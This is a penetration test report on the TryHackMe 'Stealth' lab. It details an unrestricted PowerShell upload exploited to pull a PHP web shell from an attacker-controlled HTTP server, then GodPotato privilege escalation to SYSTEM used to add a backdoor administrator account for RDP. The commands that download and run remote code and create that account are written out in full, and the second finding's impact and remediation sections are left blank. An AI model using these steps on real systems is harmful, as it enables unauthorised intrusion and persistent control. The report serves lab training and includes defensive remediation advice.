# Penetration Test Report  
**Engagement:** TryHackMe - Stealth    
**Date:** November 2025  
**Tester:** Colin S    

---

## Summary  
The engagement focused on the TryHackMe Stealth room. During the test a single, high-impact web vulnerability was exploited to gain initial access: an insecure file upload mechanism that executed uploaded PowerShell files and allowed a PHP web shell to be placed in the web server’s root directory. Following initial access, the Windows host was enumerated and the granted `SeImpersonatePrivilege` was abused to achieve `NT AUTHORITY\SYSTEM` execution and create an administrative user for reliable RDP access.  

Remediation includes disabling server-side execution of uploaded content, enforcing strict server-side validation and allowlists for file uploads, storing uploads outside the web server root directory, restricting outbound fetch capabilities from the web service, and hardening Windows accounts by removing unnecessary privileges such as `SeImpersonatePrivilege`. Additional recommendations are to monitor and alert on privileged account creation and token-impersonation activity.  
 
## Vulnerabilities  

### 1.
**CVSS v4.0 Base Score:** 9.3 (Critical)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N  

**CVSS Justification:**  
The application exposed an upload endpoint that accepted `.ps1` files client-side only and executed uploaded `.ps1` content server side. This allowed an unauthenticated remote attacker to place and execute arbitrary code on the web server, yielding remote code execution and enabling placement of a PHP web shell in the web server’s root directory. The vulnerability is network accessible (AV:N), easy to exploit (AC:L), requires no privileges (PR:N), and produces high confidentiality/integrity impact (VC/VI:H).  

**Summary:**  
The web application's upload functionality executes uploaded PowerShell files on the server and only enforces a client-side `.ps1` restriction; this restriction was bypassed to download and deploy a web shell into the web server root directory, providing remote code execution with the privileges of the web service.  

**Background:**   
The public HTTP service on port 8080 presented a simple file upload form mentioning only `.ps1` files are allowed. The application performed scanning/execution of the uploaded `.ps1` content and returned the execution results in the HTTP response body. Client-side filters were quickly bypassed and enabled upload of a crafted file to fetch a secondary file from an attacker-controlled HTTP server. The execution process was exploited to download a PHP web shell onto the web server. By navigating to the file’s location, full remote code execution was achieved via the web service account.     

**Technical details & Evidence:**  
The following steps were taken to exploit the upload feature and gain full remote code execution. The web shell used is listed in the appendices.  

A `.ps1` file was created to upload the web shell, as shown below:  
```powershell
$url = "http://10.4.12.97:5050/shell.php"
$localPath = "C:\xampp\htdocs\shell.php"
Invoke-WebRequest -Uri $url -OutFile $localPath
```
The above code sets the location of the `shell.php` file to be downloaded as the `$url` parameter and the output location and name of the file as the `$localPath` parameter and then issues `Invoke-WebRequest` to grab the file from the attacker-controlled HTTP server.

```bash
python3 -m http.server 5050
Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
10.201.36.254 - - [01/Oct/2025 20:23:01] "GET /shell.php HTTP/1.1" 200 -
```
The above shows the setup of the HTTP server and the successful retrieval of the `shell.php` file by the target web server.  

Once the `shell.php` file was saved to the target, remote code execution was achieved by navigating the file location via the browser's address bar and the following URL `http://10.201.36.254:8080/shell.php` 
![Initial Access.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Stealth/Images/Initial%20Access.png)

**Impact:**  
An unauthenticated remote attacker can execute arbitrary code on the host, place and run web shells, access local files served by the web server (including sensitive application files), and use the web shell as a pivot for further attack.  

**Remediation Advice:**  
The server-side upload handling must validate and restrict uploads (validate MIME type and perform content inspection) and must not execute uploaded files. Server code should perform strict server-side validation of file types, implement allowlists for permitted file kinds, sanitise filenames, store uploads outside the web server root directory, and run the service as a minimally privileged account without write access to web content directories. Additionally, enable robust logging, implement egress filtering to block the server from fetching arbitrary external resources, and implement Web Application Firewall rules to detect suspicious upload/execution patterns.  

---

### 2. 
**CVSS v4.0 Base Score:** 9.2 (Critical)  
CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:H/SA:N  

**CVSS Justification:**  
A low-privileged local account (`evader`) could leverage the granted `SeImpersonatePrivilege` to impersonate a SYSTEM token and execute processes as `NT AUTHORITY\SYSTEM`. This allowed creation of an administrative user and full system-level access. The attack requires local access (AV:L) but is low in complexity to perform (AC:L) when the privilege is present, and yields sever confidentiality/integrity impact.  

**Summary:**  
The `evader` user had `SeImpersonatePrivilege`, which was abused using a public exploit (GodPotato) to obtain `NT AUTHORITY\SYSTEM` execution context. This context was used to create a new administrative user (`tester`) which then allowed RDP access and gull GUI administrative control.  

**Background:**  
Windows systems with `SeImpersonatePrivilege` (or similar impersonation rights) are susceptible to token impersonation techniques (various "Potato" families). The target permitted local abuse of this privilege. This allows attackers to perform actions on the target system with the privilege of `NT AUTHORITY\SYSTEM`.  

**Technical details & Evidence:**  
Local privilege escalation was achieved using GodPotato which has been listed in the appendices.  

The first step was to transfer the GodPotato binary to the target machine via an attacker-controlled HTTP server.
```bash
python3 -m http.server 5050     
Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
10.201.104.177 - - [03/Oct/2025 20:26:07] "GET /potato.exe HTTP/1.1" 200 -
```
```powershell
evader@HostEvasion:C:\xampp\htdocs# powershell wget http://10.4.12.97:5050/potato.exe -outfile potato.exe
```
Once the binary was transferred to the target host the `/whoami` command was executed to validate `SYSTEM` execution:
```powershell
evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "cmd /c whoami"
Removed for brevity
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2252
```
Using GodPotato to execute system commands, an administrative user was created:
```powershell
evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net user tester Password123 /add"
Removed for brevity
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 828
The command completed successfully.
...
evader@HostEvasion:C:\xampp\htdocs# net users

User accounts for \\HOSTEVASION

-------------------------------------------------------------------------------
Administrator            DefaultAccount           evader
Guest                    tester                   WDAGUtilityAccount
The command completed successfully.
```
The newly created `tester` user was then granted access to the `administrators` group:
```powershell
evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net localgroup administrators tester /add"
Removed for brevity
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2592
The command completed successfully.
...
evader@HostEvasion:C:\xampp\htdocs# net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
tester
The command completed successfully.
```
With the `tester` account in the Administrators group, RDP into the hose was achieved:
```bash
xfreerdp3 /v:HostEvasion /u:tester /p:Password123
```  
![RDP - start.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Stealth/Images/RDP%20-%20start.png)  

The `tester` session was used to accept UAC and retrieve sensitive data from the target system.


**Impact:** 

**Remediation Advice:** 

---
## Appendices  
[P0wny-shell](https://github.com/flozz/p0wny-shell/tree/master)  
[GodPotato](https://github.com/BeichenDream/GodPotato)  
